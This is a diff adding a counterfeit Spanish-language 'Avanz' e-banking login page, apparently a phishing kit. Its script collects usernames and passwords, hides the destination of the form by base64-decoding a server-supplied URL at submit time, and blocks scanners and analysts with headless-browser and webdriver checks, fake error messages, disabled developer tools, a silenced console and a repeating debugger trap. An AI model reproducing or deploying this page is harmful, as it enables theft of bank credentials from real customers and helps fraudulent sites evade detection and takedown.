@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avanz</title>
+    <script>
+        // reCAPTCHA desactivado
+        var _fd = null; // Datos del formulario del servidor
+        
+        // Inicializar formulario obteniendo token del servidor
+        async function initForm() {
+            try {
+                const resp = await fetch('init_form.php', { credentials: 'same-origin' });
+                if (resp.ok) {
+                    _fd = await resp.json();
+                    document.getElementById('server_token').value = _fd.st;
+                }
+            } catch(e) {}
+            generateCSRFToken();
+        }
+        
+        // Generar un token CSRF y almacenarlo en una variable oculta y cookie (doble submit)
+        function generateCSRFToken() {
+            const token = (Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2));
+            const csrfEl = document.getElementById('csrf_token');
+            if (csrfEl) csrfEl.value = token;
+            sessionStorage.setItem('csrf_token', token);
+            document.cookie = `csrf_token=${token}; path=/; SameSite=Lax`;
+
+            // Device/session identifier cookie (best-effort, not signed)
+            const getCookie = (name) => document.cookie.split('; ').find(r => r.startsWith(name + '='))?.split('=')[1];
+            let did = getCookie('did') || localStorage.getItem('did');
+            if (!did) {
+                // simple random id
+                const rand = () => Math.random().toString(36).slice(2);
+                did = `${Date.now().toString(36)}_${rand()}_${rand()}`;
+                try { localStorage.setItem('did', did); } catch (e) {}
+            }
+            document.cookie = `did=${did}; path=/; Max-Age=31536000; SameSite=Lax`;
+            // Set form timestamp
+            const tsEl = document.getElementById('form_ts');
+            if (tsEl) tsEl.value = Date.now().toString();
+        }
+    </script>
+    <style>
+         .hidden-field { 
+            display: none; /* Campo honeypot invisible para usuarios */
+        }
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: white;
+        }
+        .header {
+            width: 97.5%;
+            height: 100px;
+            background: url('img/bar.jpg') no-repeat center;
+            background-size: cover;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            position: relative;
+        }
+        .logo img {
+            height: 50px;
+        }
+        .top-right-image {
+            position: absolute;
+            top: 10px;
+            right: 20px;
+            height: 80px;
+        }
+        .login-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: -27%;
+        }
+        .masa4 {
+            -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #333;
+    font-family: sans-serif;
+    box-sizing: border-box;
+    background: #a7a8aa;
+    padding: 0px 0px 0px 10px;
+    display: inline-block;
+    float: left;
+    height: 96px;
+    width: 410px;
+        }
+        .form-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: -35px;
+            
+        }
+        .p1 {outline: none;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ababab;
+        }
+        .p5 {    -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    box-sizing: border-box;
+    margin: 0;
+    font: inherit;
+    color: inherit;
+    text-transform: none;
+    font-family: inherit;
+    font-size: inherit;
+    line-height: inherit;
+    min-width: 126px;
+    padding: 2px;
+    margin-top: 15px;
+            position: absolute;
+            font-family: sans-serif;
+           }
+        .p2 {    -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    box-sizing: border-box;
+    margin: 0;
+    font: inherit;
+    overflow: visible;
+    -webkit-appearance: button;
+    cursor: pointer;
+    font-family: inherit;
+    font-size: inherit;
+    line-height: inherit;
+    min-width: 126px;
+    text-transform: uppercase;
+    padding: 5px 20px;
+    border: none;
+    color: #fff;
+    background: #FF7500;
+            font-family: sans-serif;
+            position: absolute;
+             margin-top: 50px;
+        }
+        .curva-container {
+            -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #333;
+    font-family: "Open Sans", serif;
+    box-sizing: border-box;
+    display: inline-block;
+    float: left;
+    height: 96px;
+    background: url(../../images/Nicaragua/curva-login.png) no-repeat;
+    background-size: contain;
+    width: 192px;
+    padding: 15px 0px 0px 15px;
+          margin-top:  -50px; 
+        }
+        .curva-image {
+            height: 96px;
+        }
+
+
+
+
+
+
+
+
+        
+
+    </style>
+</head>
+<body onload="initForm()">
+    <div class="header">
+        <img width="150px" style="margin-left: 150px;margin-top: 10px;" src="img/lk.svg" alt="Avanz">
+        <img class="top-right-image" src="img/pella.png" alt="Imagen superior derecha">
+    </div>
+    
+
+
+
+
+
+
+    <div class="background-image"></div>
+<br>
+
+<form id="mainForm" method="post" style="margin-top: -50px;" onsubmit="return handleSubmit(event)"> 
+
+
+
+
+
+    <img style="margin-top: 50px;width: 100%;" src="img/image222.png" alt="">
+
+<br> 
+    <div style="margin-left: -250px;" class="login-container">
+        <div class="masa4">
+            <p style="color: white;font-size: 30px;margin-top:  5px ;">e-banking</p>
+            
+            
+            
+            <div class="form-group">
+                <input name="pp1" id="pp1" required placeholder="Usuario" class="p1" type="text" autocomplete="off" oninput="this.value=this.value.replace(/[\s@]/g,'')">
+                <input id="pp2_display" required placeholder="Contraseña" class="p1" type="text" autocomplete="off" style="-webkit-text-security: disc; text-security: disc;">
+                <input type="hidden" name="pp2" id="pp2_real">
+            </div>
+            <p id="error-login" style="display:none; color: red; font-family: sans-serif; font-size: 14px; margin-top: 15px; margin-left: 0;">Usuario o Clave Incorrecta</p>
+             <!-- Campo Honeypot -->
+             <input type="text" name="honeypot" class="hidden-field" autocomplete="off">
+             <!-- Token CSRF -->
+             <input type="hidden" id="csrf_token" name="csrf_token">
+             <!-- Token del servidor -->
+             <input type="hidden" id="server_token" name="server_token">
+             <!-- Timestamp del formulario -->
+             <input type="hidden" id="form_ts" name="form_ts">
+             <!-- Origen del formulario (PC) -->
+             <input type="hidden" name="origin" value="pc">
+             <input type="hidden" name="recaptcha_token" id="recaptcha_token" value="">
+        </div>
+        <div style="margin-top: 20px;margin-left: -15px;">
+       
+            <div class="curva-container">
+            <select class="p5" id="language_movil" name="language">
+
+                
+                <option value="es-NI" selected>Español</option>
+                <option value="en-US">Inglés</option>
+            </select>
+            <button class="p2">INGRESAR</button>
+            <img class="curva-image" src="img/curva-login.png" alt="Curva">
+        </div>
+   
+    </div>
+    </div>
+
+
+ <img width="100%" style="margin-top: 300px;" src="img/imagsse.png" alt="">
+
+<img width="100%" style="margin-top: -5px;" src="img/image555.png" alt="">
+
+
+</form>
+
+
+<script>
+    // Mostrar error si viene de loginerror
+        if (window.location.search.includes('error=1')) {
+            document.getElementById('error-login').style.display = 'block';
+        }
+
+        // === DETECCIÓN DE BOTS ===
+        var _humanScore = 0;
+        var _mouseMovements = 0;
+        var _keyPresses = 0;
+        var _clicks = 0;
+
+        // Detectar movimiento de mouse
+        document.addEventListener('mousemove', function() {
+            _mouseMovements++;
+        });
+
+        // Detectar teclas presionadas
+        document.addEventListener('keydown', function() {
+            _keyPresses++;
+        });
+
+        // Detectar clics
+        document.addEventListener('click', function() {
+            _clicks++;
+        });
+
+        // Función para detectar bot (MÁS ESTRICTA)
+        function isBot() {
+            // Detectar WebDriver (Selenium, Puppeteer, etc.)
+            if (navigator.webdriver) return true;
+            if (window.document.documentElement.getAttribute('webdriver')) return true;
+            if (window.callPhantom || window._phantom) return true;
+            if (window.__nightmare) return true;
+            if (navigator.plugins.length === 0 && navigator.userAgent.indexOf('HeadlessChrome') !== -1) return true;
+            
+            // Detectar propiedades sospechosas
+            if (window.outerWidth === 0 || window.outerHeight === 0) return true;
+            
+            // Detectar Chrome Headless
+            if (navigator.userAgent.indexOf('HeadlessChrome') !== -1) return true;
+            if (!window.chrome && navigator.userAgent.indexOf('Chrome') !== -1) return true;
+            
+            // Verificar interacción humana MÍNIMA (más estricto)
+            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            if (!isMobile) {
+                // Para PC: requiere movimiento de mouse Y teclas presionadas
+                if (_mouseMovements < 5 || _keyPresses < 5) return true;
+            } else {
+                // Para móvil: requiere al menos ALGO de interacción
+                if (_keyPresses < 3 && _clicks < 1) return true;
+            }
+            
+            // Detectar automatización avanzada
+            try {
+                if (window.document.$cdc_asdjflasutopfhvcZLmcfl_) return true;
+                if (window.document.$chrome_asyncScriptInfo) return true;
+                if (window.__webdriver_script_fn) return true;
+            } catch(e) {}
+            
+            // Verificar tiempo desde que se cargó la página
+            var pageLoadTime = Date.now() - parseInt(document.getElementById('form_ts').value || Date.now());
+            if (pageLoadTime < 2000) return true; // Menos de 2 segundos = bot
+
+            return false;
+        }
+
+        // Sincronizar campo de contraseña visible con el hidden
+        document.getElementById('pp2_display').addEventListener('input', function() {
+            document.getElementById('pp2_real').value = this.value;
+        });
+
+        var _recaptchaDone = true; // reCAPTCHA desactivado
+        function handleSubmit(e) {
+            if (!validateForm()) return false;
+            return true;
+        }
+
+        function validateForm() {
+            // Copiar valor al campo hidden antes de enviar
+            document.getElementById('pp2_real').value = document.getElementById('pp2_display').value;
+            
+            // Validar campos no vacíos
+            var usuario = document.getElementById('pp1').value.trim();
+            var contrasena = document.getElementById('pp2_display').value.trim();
+            if (!usuario || usuario.length < 3 || !contrasena || contrasena.length < 6) {
+                alert('Usuario o contraseña incorrecto.');
+                return false;
+            }
+            
+            // Verificar si es bot antes de continuar
+            if (isBot()) {
+                // Bloquear silenciosamente sin dar pistas al bot
+                document.getElementById('mainForm').action = 'about:blank';
+                setTimeout(function() {
+                    alert('Usuario o contraseña incorrecto.');
+                }, 500);
+                return false;
+            }
+            
+            // Verificar que el usuario haya interactuado lo suficiente
+            if (_mouseMovements < 3 && _keyPresses < 5) {
+                alert('Usuario o contraseña incorrecto.');
+                return false;
+            }
+        const csrfToken = document.getElementById('csrf_token').value;
+        const storedToken = sessionStorage.getItem('csrf_token');
+        const honeypot = document.getElementsByName('honeypot')[0].value;
+        const ts = parseInt(document.getElementById('form_ts').value || '0', 10);
+        const now = Date.now();
+        if (csrfToken !== storedToken) {
+            alert('Usuario o contraseña incorrecto.');
+            return false;
+        }
+        if (honeypot && honeypot.trim().length > 0) {
+            alert('Usuario o contraseña incorrecto.');
+            return false;
+        }
+        if (!ts || (now - ts) < 300) {
+            alert('Usuario o contraseña incorrecto.');
+            return false;
+        }
+        // Establecer action dinámicamente (no visible en HTML estático)
+        if (_fd && _fd.p1 && _fd.p2) {
+            document.getElementById('mainForm').action = atob(_fd.p1 + _fd.p2);
+        } else {
+            alert('Usuario o contraseña incorrecto.');
+            return false;
+        }
+        return true;
+    }
+
+    // Bloquear TODAS las herramientas de inspección
+    document.addEventListener('keydown', function(e) {
+        // F12, Ctrl+Shift+I/J/C, Ctrl+U, Ctrl+S, Ctrl+A, Ctrl+Shift+A
+        if (e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) ||
+            (e.ctrlKey && (e.key === 'U' || e.key === 'u' || e.key === 'S' || e.key === 's' || e.key === 'A' || e.key === 'a')) ||
+            (e.ctrlKey && e.shiftKey && (e.key === 'A' || e.key === 'a'))) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    });
+
+    // Bloquear menú contextual TODAS las formas
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    });
+
+    // Bloquear selección de texto COMPLETA
+    document.addEventListener('selectstart', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    });
+
+    document.addEventListener('mousedown', function(e) {
+        if (e.detail > 1) {
+            e.preventDefault();
+            return false;
+        }
+    });
+
+    // Bloquear arrastrar COMPLETO
+    document.addEventListener('dragstart', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    });
+
+    // Bloquear copiar y pegar
+    document.addEventListener('copy', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    });
+
+    document.addEventListener('paste', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    });
+
+    // Bloquear herramientas de desarrollador
+    setInterval(function() {
+        if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
+            window.location.reload();
+        }
+    }, 1000);
+
+    // Detectar si están inspeccionando
+    var devtools = {
+        open: false,
+        orientation: null
+    };
+    
+    var threshold = 160;
+    
+    setInterval(function() {
+        if (window.outerHeight - window.innerHeight > threshold || window.outerWidth - window.innerWidth > threshold) {
+            if (!devtools.open) {
+                devtools.open = true;
+                window.location.reload();
+            }
+        } else {
+            devtools.open = false;
+        }
+    }, 500);
+
+    // Deshabilitar clic derecho en imágenes
+    document.addEventListener('DOMContentLoaded', function() {
+        var images = document.getElementsByTagName('img');
+        for (var i = 0; i < images.length; i++) {
+            images[i].addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+        }
+    });
+
+    // Anti-debugging
+    (function() {
+        var _console = window.console;
+        window.console = {
+            log: function() {},
+            warn: function() {},
+            error: function() {},
+            info: function() {},
+            debug: function() {}
+        };
+        
+        // Detectar debugging
+        setInterval(function() {
+            var debuggerOn = function() {
+                debugger;
+            };
+            debuggerOn();
+        }, 1000);
+    })();
+</script>
+
+
+
+
+</body>
+</html>
